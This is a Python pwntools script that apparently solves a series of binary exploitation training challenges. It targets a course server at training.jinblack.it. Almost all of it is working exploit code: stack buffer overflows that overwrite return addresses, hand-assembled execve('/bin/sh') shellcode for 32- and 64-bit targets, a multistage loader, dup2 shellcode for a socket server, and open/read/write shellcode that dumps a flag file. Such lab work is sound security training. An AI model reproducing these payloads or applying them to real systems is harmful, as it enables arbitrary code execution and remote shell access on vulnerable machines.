import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ["exo-open", "--launch", "TerminalEmulator"]

class switcher():
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def shellcode(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2001)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x400729
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("name?\n")

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        buffer = 0x0000000000601080
        shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

        shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8
        shellcode = shellcode.ljust(1016, b"\x90")

        payload = shellcode + p64(buffer)

        r.send(payload)
        r.interactive()

    @classmethod
    def sh3llc0d3(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2002)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("name?\n")

        buffer = 0x0804c060
        shellcode = b"\xEB\x1F\x5E\x89\x76\x08\x31\xC0\x88\x46\x07\x89\x46\x0C\xB0\x0B\x89\xF3\x8D\x4E\x08\x8D\x56\x0C\xCD\x80\x31\xDB\x89\xD8\x40\xCD\x80\xE8\xDC\xFF\xFF\xFF"

        shellcode = shellcode + b"/bin/sh"
        shellcode = shellcode.rjust(212, b"\x90")

        payload = shellcode + p32(buffer)
        payload = payload.ljust(1128, b"\x90")

        r.send(payload)
        r.interactive()

    @classmethod
    def multistage(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2003)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x00401251
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("name?\n")

        """
        mov edx, 0x30
        mov esi, eax
        mov edi, 0x0
        mov eax, 0x0
        syscall
        """
        shellcode = b"\xBA\x50\x00\x00\x00\x89\xC6\xBF\x00\x00\x00\x00\xB8\x00\x00\x00\x00\x0F\x05"

        r.send(shellcode)

        shellcode = b"".ljust(19, b"\x90")
        shellcode = shellcode + b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

        payload = shellcode + b"/bin/sh\x00"

        r.send(payload)
        r.interactive()
    
    @classmethod
    def gimme3bytes(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2004)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x4011f1
            c
            """)
            
            input("Press any key to continue.")
            r.recvuntil("\n>")

        shellcode = b"\x5A\x0F\x05"

        r.send(shellcode)

        shellcode = b"".ljust(3, b"\x90")
        shellcode = shellcode + b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

        payload = shellcode + b"/bin/sh\x00"

        r.send(payload)
        r.interactive()

    @classmethod
    def server(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2005)

            """
            mov rax, 0x21
            mov rsi, 0x0
            syscall
            mov rax, 0x21
            mov rsi, 0x1
            syscall
            """

            buffer = 0x00000000004040c0
            shellcode = b"\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"

            shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8
            shellcode = shellcode.ljust(1016, b"\x90")

            payload = shellcode + p64(buffer)

            r.send(payload)
            r.interactive()

        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x4013d2
            b *0x40130d
            c
            """)
            
            input("Press any key to continue.")

        r.interactive()

    @classmethod
    def onlyreadwrite(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2006)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x401482
            c
            """)
            
            input("Press any key to continue.")

        """
        jmp endopen
        open:
        mov rax, 0x2
        pop rdi
        mov rsi, 0x0
        mov rdx, 0x0
        syscall

        mov rdi, rax
        mov rax, 0x0
        mov rsi, 0x404188
        mov rdx, 0x50
        syscall

        mov rax, 0x1
        mov rdi, 0x1
        mov rsi, 0x404188
        mov rdx, 0x50
        syscall

        endopen:
        call open
        """
        
        buffer = 0x00000000004040c0
        shellcode = b"\xEB\x50\x48\xC7\xC0\x02\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC6\x88\x41\x40\x00\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x88\x41\x40\x00\x48\xC7\xC2\x50\x00\x00\x00\x0F\x05\xE8\xAB\xFF\xFF\xFF"
 
        shellcode = shellcode + b"./flag\x00"
        shellcode = shellcode.ljust(1016, b"\x90")

        payload = shellcode + p64(buffer)

        r.send(payload)
        r.interactive()

switcher.indirect(parser.parse_args())
